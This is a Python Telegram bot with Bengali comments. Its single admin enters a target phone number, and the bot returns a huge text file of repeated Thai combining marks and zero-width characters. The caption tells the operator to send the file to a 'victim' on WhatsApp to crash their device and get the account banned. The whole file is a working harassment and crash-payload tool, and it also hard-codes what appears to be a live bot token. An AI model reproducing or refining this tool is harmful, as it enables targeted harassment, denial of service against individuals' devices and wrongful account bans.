import logging
import sqlite3
import os
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ১. লগিং সেটআপ
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ২. আপনার নতুন টোকেন এবং অ্যাডমিন আইডি
TOKEN = "8675593212:AAHQ24gVWFi0zTGgUFXN5qkr_D2IyE0tE88"
ADMIN_ID = 6856009995  # শুধু এই আইডিতেই কাজ করবে

# ৩. ডেটাবেস সেটআপ
def init_db():
    conn = sqlite3.connect('m_r_developer_pro.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. শক্তিশালী পেলোড তৈরির ফাংশন (আইডি ব্যান করার জন্য ১০ লক্ষ+ ক্যারেক্টার)
def create_ban_payload(target_number):
    # জটিল ইউনিকোড প্যাটার্ন যা হোয়াটসঅ্যাপ রেন্ডারিং ইঞ্জিনকে ওভারলোড করে
    crash_pattern = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 30
    invisible_mass = "\u200B\u200C\u200D\uFEFF" * 40
    
    # প্রায় ১২ লক্ষ বার রিপিটেশন (সর্বোচ্চ পাওয়ার)
    final_data = (crash_pattern + invisible_mass) * 1200000 
    
    file_name = f"BAN_REPORT_{target_number}.txt"
    with open(file_name, "w", encoding="utf-8") as f:
        f.write(final_data)
    return file_name

# ৫. স্টার্ট কমান্ড (অ্যাডমিন চেকসহ)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ দুঃখিত! আপনি এই বটের অ্যাডমিন নন। আপনার এক্সেস নেই।")
        return

    # বাটন সেটআপ
    keyboard = [
        [InlineKeyboardButton("🚀 Attack WhatsApp (99% Ban)", callback_data='attack')],
        [InlineKeyboardButton("📊 Stats", callback_data='status')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_msg = (
        "🔥 **M R DEVELOPER ULTIMATE PANEL** 🔥\n\n"
        f"স্বাগতম বস! আপনার আইডি ({user_id}) ভেরিফাইড।\n"
        "নিচের বাটন থেকে অপারেশন শুরু করুন।"
    )
    await update.message.reply_text(welcome_msg, reply_markup=reply_markup, parse_mode='Markdown')

# ৬. বাটন ক্লিক হ্যান্ডলার
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    if user_id != ADMIN_ID:
        await query.answer("Access Denied!", show_alert=True)
        return

    await query.answer()

    if query.data == 'attack':
        await query.edit_message_text("টার্গেট নম্বর দিন (উদাঃ 88017...):")
        context.user_data['state'] = 'WAITING_NUM'
    
    elif query.data == 'status':
        conn = sqlite3.connect('m_r_developer_pro.db')
        cur = conn.cursor()
        cur.execute("SELECT count FROM stats WHERE id=1")
        total = cur.fetchone()[0]
        conn.close()
        await query.edit_message_text(f"📊 **অপারেশন স্ট্যাটাস**\n\nমোট সফল আইডি হিট: {total} টি।")

# ৭. ফাইল জেনারেশন এবং ডেলিভারি
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        return

    if context.user_data.get('state') == 'WAITING_NUM':
        target = update.message.text
        context.user_data['state'] = None
        
        load_msg = await update.message.reply_text(f"⏳ {target} এর জন্য শক্তিশালী ডাটা তৈরি হচ্ছে...")
        
        try:
            # পেলোড তৈরি
            file_path = create_ban_payload(target)
            
            # ফাইল পাঠানো
            with open(file_path, 'rb') as doc:
                await update.message.reply_document(
                    document=doc,
                    caption=(
                        f"✅ **পেলোড তৈরি সম্পন্ন!**\n\n"
                        f"Target: `{target}`\n\n"
                        f"⚠️ **নির্দেশিকা:** এই ফাইলটি ভিকটিমকে হোয়াটসঅ্যাপে ডকুমেন্ট হিসেবে পাঠান। "
                        "সে এটি ওপেন করলে তার সিস্টেম ক্রাশ করবে এবং স্প্যাম ফিল্টারে আইডি ব্যান হবে।"
                    ),
                    parse_mode='Markdown'
                )
            
            # স্ট্যাটাস আপডেট
            conn = sqlite3.connect('m_r_developer_pro.db')
            cur = conn.cursor()
            cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
            conn.commit()
            conn.close()
            
            # ফাইল ক্লিনআপ
            os.remove(file_path)
            await load_msg.delete()
            
        except Exception as e:
            await update.message.reply_text(f"❌ এরর: {str(e)}")

# ৮. মেইন ফাংশন
def main():
    init_db()
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("M R DEVELOPER Bot is Live...")
    application.run_polling()

if __name__ == '__main__':
    main()
    
